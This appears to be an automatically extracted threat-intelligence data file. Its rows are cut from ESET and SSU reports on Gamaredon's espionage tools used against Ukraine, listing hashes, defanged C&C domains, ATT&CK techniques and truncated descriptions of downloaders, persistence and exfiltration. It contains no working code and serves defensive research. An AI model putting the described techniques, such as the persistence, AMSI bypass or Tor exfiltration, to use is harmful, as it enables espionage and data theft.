1.0.0,actor--gamaredon,artifact--sha256:0375cacba62401d96db23b585b3ed0578b509ffef4cc53a332c086006a25398b,observation--sha256:14f0cfb103da453ac1f4d97b345b855fe9a3f43e0512bc5fe76e6b8c46edcb35,command,F33F786641F0BE823BE8 N/A PowerShell/Pterodo.BY PteroPSDoor variant 2 version 7111.,F33F786641F0BE823BE8 N/A PowerShell/Pterodo.BY PteroPSDoor variant 2 version 7111,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,40 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 945A50678E6E9AA29370 7E4F41E9BC81B9098BC5 N/A PowerShell/TrojanDownlo ader.Agent.GBK Downloader of PteroGram. AB7C5C7CD6F75B1D0A7A D29176A254055BE5356E N/A VBS/Pterodo.SC Downloader of PowerSh ell version of PteroLNK. 866E874CFF4EAD298899 24AA02630E68AE252B55 N/A VBS/Pterodo.SL Downloader of the VBScript version of PteroLNK. 49CF239AB2EBD04CAFDC EC07FBB0C1C1A43E8C,
1.0.0,actor--gamaredon,artifact--sha256:467b9e987b1838c89bff19fa0cc43135d0a5235e9ff294eac036b34cab3d3a4e,observation--sha256:caf2f25dd7ce5f13d66a428b05bdcf9972068ade42e6774f7f45928f28140351,command,F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell,F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,41 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 025E3D88C53FC12D5A4A AB726E696F2815BAC84D N/A VBS/Pterodo.TX PteroPSLoad – PowerShell downloader. D5576E578518E474A5DF F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell downloader. 28F4F0367C2BB0574C8A 7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell downloader. E0BD8855159CB708789C 4DE183E107C5C117FBA1 N/A PowerShell/P,
1.0.0,actor--gamaredon,artifact--sha256:bdafebdba45f0010b07977e888a1a6f90dcd9bd6563dc6d5885d3e48c0c43dec,observation--sha256:610edb2448b1c2fb0be7ee221bc4a232fed77f099dcb95e47cb22d3aa02f2836,command,F7A3B876427CDF276473 N/A PowerShell/Pterodo.GA Downloader of PteroCookie.,F7A3B876427CDF276473 N/A PowerShell/Pterodo.GA Downloader of PteroCookie,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"39 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 IOCS Files In this section, w e only provide one example for each tool or variant . All IoCs were already provided in the MISP events published with private ESET Threat Intelligence reports throughout 2022 and 2023. SHA-1 Filename Detection Description DF1C0A70E7A02B839AB3 AAC3FC410E61EEFB58EB N/A VBS/Pterodo.AEV PteroX – a VBScript general -purpose downloader. B50F10BBDB49BE6D868B 09F3E1DD6C78D58D8E",
1.0.0,actor--gamaredon,artifact--sha256:0faeae097e67d0b97f5bf65143089a121521b5ad56d59501f1f0fe3256080255,observation--sha256:6f8bbcf04ce56338a4fb04ad83cbfe53e49a67caff8c792d62b682c287f3cb46,command,F8A12FF5995DD24CD259 N/A PowerShell/Pterodo.GN PowerShell version of PteroLNK – USB,F8A12FF5995DD24CD259 N/A PowerShell/Pterodo.GN PowerShell version of PteroLNK – USB,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,40 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 945A50678E6E9AA29370 7E4F41E9BC81B9098BC5 N/A PowerShell/TrojanDownlo ader.Agent.GBK Downloader of PteroGram. AB7C5C7CD6F75B1D0A7A D29176A254055BE5356E N/A VBS/Pterodo.SC Downloader of PowerSh ell version of PteroLNK. 866E874CFF4EAD298899 24AA02630E68AE252B55 N/A VBS/Pterodo.SL Downloader of the VBScript version of PteroLNK. 49CF239AB2EBD04CAFDC EC07FBB0C1C1A43E8C,
1.0.0,actor--gamaredon,artifact--sha256:2b4d4b37cb4b583d76373d7ec27457df57422c95c049f291b467137a83f08490,observation--sha256:eec3308db10569e75f6c3eb27f1c6817b7d10e09d775b50cbc30047c6d3bdadf,command,Figure 10. PowerShell script example with C#,Figure 10. PowerShell script example with C#,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Figure 10. PowerShell script example with C#,
1.0.0,actor--gamaredon,artifact--sha256:fa6fcc2efd1f534e21098ef30b60ab2366e34a4a8aad0a4831756a7f2016972a,observation--sha256:d85d4775924472bd8c0f672cc01f33411badd38adb8ee845acf844b365de684a,command,Figure 9. PowerShell script example,Figure 9. PowerShell script example,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"PowerShell The Security Service of Ukraine has detected Armageddon using two types of PowerShell scripts. One of them is designed to obtain information about the user and the information system, sending it to the command & control server, loading in response an additional module – the executable file with its simultaneous hidden start (Figure 9). Figure 9. PowerShell script example Another script file contained 4039 lines of program code. At the same time, PowerShell commands were actually inten",
1.0.0,actor--gamaredon,artifact--sha256:55078cbc374ff3c3630f7e7599dbebefcaa02a6fba8d91dee5f63174628fbe28,observation--sha256:90a981bca944699447ae1b5b44b7a8458cbf86a31d51b0de762d0d19f81d7d99,command,"For persistence, PteroPSDoor establishes a scheduled task that runs a brief PowerShell script,","For persistence, PteroPSDoor establishes a scheduled task that runs a brief PowerShell script",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 27}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"26 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 In addition to file stealing, PteroPSDoor has a feature where every file uploaded to the C&C server can trigger a payload response. This payload, either a PE file or VBScript, is parsed, dr opped to %TEMP% with a random filename, and executed. To regularly receive payloads, PteroPSDoor creates a file with random content in a dedicated directory before exfiltrating staged files. This ensures it always",
1.0.0,actor--gamaredon,artifact--sha256:143030c044244289c877e412447b80b87ec94aeeb03c508fce3ea1cfbd424224,observation--sha256:5242e251012af123fe81254b78d247c0fe3f188504dc26f3c04c7264fea0679a,command,"For persistence, a short PowerShell script is added u nder the HKCU Run key that , upon its own","For persistence, a short PowerShell script is added u nder the HKCU Run key that , upon its own",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroLNK is obfuscated in multiple layers, detailed in the Obfuscation section. The obfuscation applied to the scheduler component, where selected characters are replaced with random sequences, is also used on code blocks embedded as base64 -encoded blobs. Nearly all strin g variables and small code blocks are divided into smaller parts and then concatenated before use or execution. Additionally, fun",
1.0.0,actor--gamaredon,artifact--sha256:20064d49185ccd8d4fb620f5c92fdd885444eb96ae75558cb9140d04a9da37e0,observation--sha256:9eed8acf56355530a564727857a6751863761cb92bd51bfb0cd7d07deee6f917,command,Gamaredon uses PowerShell to execute,Gamaredon uses PowerShell to execute,candidate,2023-12-04T00:00:00Z,day,known,same-record,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 48}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,47 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 IP Domain Hosting provider First seen Details N/A loturam[.]ru N/A 2023-12-04 Gamaredon C&C server. N/A nikortal[.]ru N/A 2023-12-06 Gamaredon C&C server. N/A nododru[.]ru N/A 2023-12-20 Gamaredon C&C server. 62.133.62[.]73 N/A GLOBAL INTERNET SOLUTIONS LLC 2023-12-20 Gamaredon C&C server. MITRE ATT&CK TECHNIQUES This table was built usin g version 15 of the MITRE ATT&CK framework . Tactic ID Name De,
1.0.0,actor--gamaredon,artifact--sha256:20064d49185ccd8d4fb620f5c92fdd885444eb96ae75558cb9140d04a9da37e0,observation--sha256:2db4b93774492c5c60407dde4d1be1b90a4f35408cf5a06fbdb3e45b0e787a63,command,Gamaredon uses PowerShell to execute,Gamaredon uses PowerShell to execute,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"34 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances MITRE ATT&CK TECHNIQUES This table was built using version 1 9 of the MITRE ATT&CK framework. Tactic ID Name Description Resource Development T1583.001 Acquire Infrastructure: Domains Gamaredon registers domains for its C&C servers. T1583.003 Acquire Infrastructure: Virtual Private Server Gamaredon rents servers for its C&C infrastructure. T1583.007 Acquire Infrastructure: Serverless Gamaredon hides its C&C infrastr",
1.0.0,actor--gamaredon,artifact--sha256:126dcd998a35c40f0e44e1a3670cd6e88c22d9aeda51ed1602f26b69681d1c88,observation--sha256:8eb162ec0044a4011a905a2114eb8bfc52e813e4df91cf984662b449298f752d,command,Gamaredon uses mshta.exe to execute,Gamaredon uses mshta.exe to execute,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 50}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,49 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Tactic ID Name Description T1564.001 Hide Artifacts: Hidden Files and Directories PteroLNK creates hidden files. T1562.001 Impair Defenses: Disable or Modify Tools PteroSocks disables AMSI by calling the method AmsiUtils.Uninitialize . T1070.004 Indicator Removal: File Deletion PteroPSDoor deletes staged files after successful exfiltration. T1036.004 Masquerading: Masquerade Task or Service Gamaredon,
1.0.0,actor--gamaredon,artifact--sha256:126dcd998a35c40f0e44e1a3670cd6e88c22d9aeda51ed1602f26b69681d1c88,observation--sha256:865eed01b67718eeca7ab4e66eee64f29391cc0dbeecd79fe2b6c3c98c83c265,command,Gamaredon uses mshta.exe to execute,Gamaredon uses mshta.exe to execute,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"37 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Tactic ID Name Description T1027.015 Obfuscated Files or Information: Compression Gamaredon uses, in its spearphishing campaigns, bzip2 -compressed HTA files, and HTA files packed in ZIP and RAR archives. T1027.016 Obfuscated Files or Information: Junk Code Insertion Gamaredon inserts junk code into its malicious tools. T1684.001 Social Engineering: Impersonation Gamaredon sends spearphishing emails impersonating Uk",
1.0.0,actor--gamaredon,artifact--sha256:ba1ede549d3a1a3251de5e00f24defd3862c5d71c990c3ae9e4caaad72139cfa,observation--sha256:ab899ab121da9b9c2df0f1b5e14c0d95a6ad965f3e51f88caed1b05c605baaaf,command,"Gamaredon ’s dedicated downloaders, which can be VBScripts or PowerShell scripts in VBScript","Gamaredon ’s dedicated downloaders, which can be VBScripts or PowerShell scripts in VBScript",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 · a remote template that has been downloaded by a Word document weaponized by PteroTemplate, and · a default Word template ( Normal.dotm ) weaponized by PteroTemplate. The process of weaponizing Word documents and templates is described in detail in the respective sections of the PteroDoc and PteroTemplate sections. Note that the downloader is only dropped when the documents are closed, which trigger",
1.0.0,actor--gamaredon,artifact--sha256:f102d946fd282522627785437ed57691b50f673724acd83b02b18d9e84bf1ef1,observation--sha256:47ab72e3f09ac8cd62b08c2dd06ee930af2a2978d634c821019192bcd81cae54,command,"HKCU\Software\Microsoft\Windows\CurrentVersion \Run, which contains a short PowerShell","HKCU\Software\Microsoft\Windows\CurrentVersion \Run, which contains a short PowerShell",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"12 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Firstly, PteroPSLoad resolves the C&C server ’s IP address from the hardcoded domain by querying the default system DNS. Secondly, it uses that IP address to send an HTTP GET request with the /get.php URI to its C&C server to fetch its updated version . Thirdly, it ensures the persistence of the downloaded update by creating an HKCU Run value that will execute it upon every system start, serving as b",
1.0.0,actor--gamaredon,artifact--sha256:0df438b70ac2b497b8fa28157940ae8e5c442f967bf08d4c338a6ee1b9842d2f,observation--sha256:ff02fcc27b40e22fbd5768555c13b97c97bb3e6742d25ac64d2f8feef51ad1a8,command,"If the content starts with the ! character, it’s treated as a PowerShell command and executed via","If the content starts with the ! character, it’s treated as a PowerShell command and executed via",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"28 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroScreen First seen by ESET Research in July 2022, PteroScreen (SHA-1: BA2366ED4E83FFC6DEC489C9011FE181CE169A47 ) is a PowerShell scree n-capturing tool that takes screenshots of all screens and temporarily stores the image in %TEMP% \<randomNumber>.png . The screenshot is then base64 encoded and uploaded to the C&C server along with the system drive ’s volume serial number via an HTTP POST reques",
1.0.0,actor--gamaredon,artifact--sha256:9f3460ce30ef463731c505cd3bc86df837fbb6f3fc5faf372e034b568cda23f2,observation--sha256:eaed9cfae735693a672cd439445a2c1d58819ad96a0e21bca938fd0b26a8e6cf,command,"If the primary exfiltration method fails, PteroPSDoor retries via Tor using curl.exe and curl’s SOCKS5","If the primary exfiltration method fails, PteroPSDoor retries via Tor using curl.exe and curl’s SOCKS5",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"24 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Capabilities PteroPSDoor’s main goal is to search all mapped drives for files with specific extensions, and subsequently exfiltrate such files to C&C servers or cloud storage accounts operated by Gamaredon. On March 1st, 2025, PteroPSDoor received quite an interesting update , in which Gamaredon added several fallback methods – probably to overcome network -based blocking. First, Gamaredon added a fallback upload me",
1.0.0,actor--gamaredon,artifact--sha256:10a0a7d86df88e79a86125a8155a7cdc7d0b48c82bfa6ca95408838c92a5d119,observation--sha256:025e6a2bd77da33bb648ba85fda0e1989a9969da79fa89fe4ced8f0106fcdfff,command,"In 2022, the trend slowly started to shift towards the use of VBScript and PowerShell in tandem, and","In 2022, the trend slowly started to shift towards the use of VBScript and PowerShell in tandem, and",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"3 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 deploying multiple simple downloaders or backdoors simultaneously. The lack of sophistication of Gamaredon t ools is compensated by frequent updates and use of regularly changing obfuscation. In the past, Gamaredon used numerous downloaders and various tools to move laterally within infiltrated systems. Its ultimate payload was a file stealer, whose main goal was to look for files with specific file e",
1.0.0,actor--gamaredon,artifact--sha256:1af1ac62d77d7fa68d7210b0b1e82090ea887aca54b5d01e555082c284eccf5f,observation--sha256:69837d30b7ca3cddad6f553c948956147db5853318ec0b205b1e0579125777a5,command,In August 2023 we discovered a PowerShell infostealer (SHA -1:,In August 2023 we discovered a PowerShell infostealer (SHA -1:,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:93fbd058d3149a63641582681cad2ac1be4d4d6230b368da957eb5694f846c5b,observation--sha256:025dad2076bee341930eb6ec566423855af8a36680159e56546da4e4fb7d4cec,command,"In fact, the first stage now lies in downloading the WGET","In fact, the first stage now lies in downloading the WGET",candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"However, it should be noted that only about 200 lines of code are actually functional. All other lines are generated only for distraction, which can be attributed to the program code obfuscation technic. In fact, the first stage now lies in downloading the WGET console utility and scripts to run it, set up persistence fo r rebooting by making changes to the registry and/or task scheduler, as well as collecting information about the system (computer name, disk name, IP -address, login and passwor",
1.0.0,actor--gamaredon,artifact--sha256:7635e77527e159b788a0d3c36c8696c4438c867197177e9f7fc7842e7d95dc46,observation--sha256:7ef1f9a29dff49fbb6b3ded3cecc1346b670b453e20c51ea5eb21aa63b94bfa3,command,Malware has used rundll32 to launch,Malware has used rundll32 to launch,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,HKCU\Software\Microsoft\Office\<versio n>\<product>\Security\AccessVBOM T1036 Masquerading Group places components into Windows folder with names mimicking common system services or drivers T1221 Template Injection DOCX files contain a request body to download malicious DOT document templates T1497 .002 Virtualization/Sandbox Evasion Malware pings for DNS servers and checks for launched processes. Also try to identify sandbox name and compare it with hardcoded namelist T1218 .011 Signed Binary P,
1.0.0,actor--gamaredon,artifact--sha256:3b0ac955d291a959b144bbcc9754127daee6409b62093f908544da41390168d1,observation--sha256:fa33471fb75b83d41ee9efd33ff573d58a3a6bb8dbf2e3c01e3e2454f453a4fc,command,"Moreover, built -in downloaders of PteroScreen and the PowerShell version of PteroLNK can also r eceive","Moreover, built -in downloaders of PteroScreen and the PowerShell version of PteroLNK can also r eceive",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 · a remote template that has been downloaded by a Word document weaponized by PteroTemplate, and · a default Word template ( Normal.dotm ) weaponized by PteroTemplate. The process of weaponizing Word documents and templates is described in detail in the respective sections of the PteroDoc and PteroTemplate sections. Note that the downloader is only dropped when the documents are closed, which trigger",
1.0.0,actor--gamaredon,artifact--sha256:5a61d8cfc75701ad66b2f72d80b2f3b9aab652e302d433310eca982c3942a65e,observation--sha256:3197a0b11a0d8d01f468c9e0d039a0a893ea75a9109749eae96ef705453f0902,command,"On February 27th, 2025, we discovered PteroOdd – a tiny PowerShell downloader that had been deployed","On February 27th, 2025, we discovered PteroOdd – a tiny PowerShell downloader that had been deployed",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"15 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances This header is used to upload the contents of the registry value HKLM\SOFTWARE \Microsoft \Cryptography \MachineGuid , which serves as a victim identifier. PteroOdd On February 27th, 2025, we discovered PteroOdd – a tiny PowerShell downloader that had been deployed by PteroGraphin (see our Gamaredon 2024 white paper ). PteroOdd, as shown in Figure 10, retrieves one PowerShell payload via the Telegra.ph API , and run",
1.0.0,actor--gamaredon,artifact--sha256:180afd86b2a37ccebed30ff61b7b089d64ddebc2b142b788fc3e0e82c7e26901,observation--sha256:88bbfb9d45aa6bdc2a1a2b1c8244ea4f41b9dab1d9aa62a38629e073918a5ca4,command,"Once PteroPaste is installed, the runner component is launched in a separate PowerShell process.","Once PteroPaste is installed, the runner component is launched in a separate PowerShell process",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"11 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances • a downloader, • an embedded weaponizer, and • an embedded runner. The downloader is created from an embedded template and regularly retriev es payloads from dead drops. Later instances retrieve payloads from C&C servers hidden behind tunnel services, not from dead drops. Most PteroPaste payloads seen in ESET telemetry were instances of PteroEffigy , described in a later section. The rest were Turla PowerShell payl",
1.0.0,actor--gamaredon,artifact--sha256:8de40028d12249c8afb553ef6a958bf814219ac49f220c0af49376958ee6a8cb,observation--sha256:10565235d563dee090f841a5e472006639fb882f122b095197ea6f192675cb61,command,"Once a minute, PteroCache downloads and executes a PowerShell payload, which can be any of the","Once a minute, PteroCache downloads and executes a PowerShell payload, which can be any of the",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"17 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 12. PteroCache (prettified) Capabilities Once a minute, PteroCache downloads and executes a PowerShell payload, which can be any of the Gamaredon tools. Some instances we observed were able to deploy an unlimited number of payloads, while some could deploy only up to 10 payloads. Network protocol For communication with its C&C server, PteroCache uses an HTTP GET request with the HTTP header x - cache, in whic",
1.0.0,actor--gamaredon,artifact--sha256:42fd5ffba30482c4604631add2699560e088164881a76534771e6f35cbd61fdf,observation--sha256:cce7c6ae2127992ff421f2678c1241c89f5e01f3c571c05fc23d2763757a9d51,command,Persistence is ensured by dropping a small PowerShell loader with a randomly generated filename to,Persistence is ensured by dropping a small PowerShell loader with a randomly generated filename to,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 This whole functionality was later removed from PteroPSLoad. account.php This version, in comparison to the previous one, contains two notable changes. The first in the persistence mechanism used, and the second in the way that it communicates with its C&C server. Persistence is ensured by dropping a small PowerShell loader with a randomly generated filename to %ALLUSERSPROFILE% and scheduling it to ",
1.0.0,actor--gamaredon,artifact--sha256:8c84ec20ea45ece057ca1474872c5e878645e493b5dc13ccb515247176d01975,observation--sha256:cc7d5937ff7b57a2360f87f0d0f5e16e1d4869d2037008776e76f03cc7382c18,command,PowerShell,PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"PowerShell The Security Service of Ukraine has detected Armageddon using two types of PowerShell scripts. One of them is designed to obtain information about the user and the information system, sending it to the command & control server, loading in response an additional module – the executable file with its simultaneous hidden start (Figure 9). Figure 9. PowerShell script example Another script file contained 4039 lines of program code. At the same time, PowerShell commands were actually inten",
1.0.0,actor--gamaredon,artifact--sha256:8c84ec20ea45ece057ca1474872c5e878645e493b5dc13ccb515247176d01975,observation--sha256:8141125ae215b60c34b45450192c90859617dc9a757d15a39de445e1ea72abf3,command,PowerShell,PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"10 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 General -purpose downloaders We recognize eight types of general -purpose downloaders: five standalone and three built -in. Standalone downloaders primarily deliver payloads, whereas built -in dow nloaders have other primary capabilities but can also deliver payloads. PteroPSLoad PteroPSLoad is a downloader written in PowerShell that we discovered in October 2021 . After it is deployed, it remains pe",
1.0.0,actor--gamaredon,artifact--sha256:8c84ec20ea45ece057ca1474872c5e878645e493b5dc13ccb515247176d01975,observation--sha256:2c804a29b13e1641bdab70ed41bc8e57ba95ec1ddc2f7794cab9036555db1bec,command,PowerShell,PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 URL leading to a PE file PowerShell command Encrypted VBScript PteroPSLoad time.php 13BA279D8602FEE7CEDE152B6A9148CD9D2F6662 ✓ ✓ PteroPSLoad slot.php B99D4724077B0A2CBEEE38332C05F3D4171C9DCC ✓ ✓ ✓ PteroPSLoad index.php 025E3D88C53FC12D5A4AAB726E696F2815BAC84D ✓ ✓ ✓ PteroPSLoad new.php D5576E578518E474A5DFF654C44AB3EC4A6E4ECF ✓ ✓ ✓ PteroPSLoad post.php E0BD8855159CB708789C4DE183E107C5C117FBA1 ✓ ✓ ✓ Pt,
1.0.0,actor--gamaredon,artifact--sha256:8c84ec20ea45ece057ca1474872c5e878645e493b5dc13ccb515247176d01975,observation--sha256:990d75c526903f5e052a147b391e7f4ef6a3aafc8c1fff5c525b24231cc4e261,command,PowerShell,PowerShell,candidate,2023-12-04T00:00:00Z,day,known,same-record,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 48}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,47 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 IP Domain Hosting provider First seen Details N/A loturam[.]ru N/A 2023-12-04 Gamaredon C&C server. N/A nikortal[.]ru N/A 2023-12-06 Gamaredon C&C server. N/A nododru[.]ru N/A 2023-12-20 Gamaredon C&C server. 62.133.62[.]73 N/A GLOBAL INTERNET SOLUTIONS LLC 2023-12-20 Gamaredon C&C server. MITRE ATT&CK TECHNIQUES This table was built usin g version 15 of the MITRE ATT&CK framework . Tactic ID Name De,
1.0.0,actor--gamaredon,artifact--sha256:8c84ec20ea45ece057ca1474872c5e878645e493b5dc13ccb515247176d01975,observation--sha256:7d59f29b7b52f1e2129f7acdfbc75462cd6bbe6f7e49f5753cacd40e6d658048,command,PowerShell,PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,8 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Tool Category Written in Description PteroDash Downloader VBScript Downloa ds various payloads. PteroRisk Downloader VBScript Downloads various payloads. PteroCDrop Dropper C Drops various VBScript payloads. PteroLNK Weaponizer VBScript Weaponizes connected USB drives. PowerShell PteroDoc Weaponizer VBScript Weaponizes Word documents. PteroTemplate Weaponizer VBScript Weaponizes Word templates. PteroD,
1.0.0,actor--gamaredon,artifact--sha256:8c84ec20ea45ece057ca1474872c5e878645e493b5dc13ccb515247176d01975,observation--sha256:99951d3ca5d66f7f0b45be23d6c5f05c33f5be5a6e62b1d4dd37db33ca835733,command,PowerShell,PowerShell,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"34 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances MITRE ATT&CK TECHNIQUES This table was built using version 1 9 of the MITRE ATT&CK framework. Tactic ID Name Description Resource Development T1583.001 Acquire Infrastructure: Domains Gamaredon registers domains for its C&C servers. T1583.003 Acquire Infrastructure: Virtual Private Server Gamaredon rents servers for its C&C infrastructure. T1583.007 Acquire Infrastructure: Serverless Gamaredon hides its C&C infrastr",
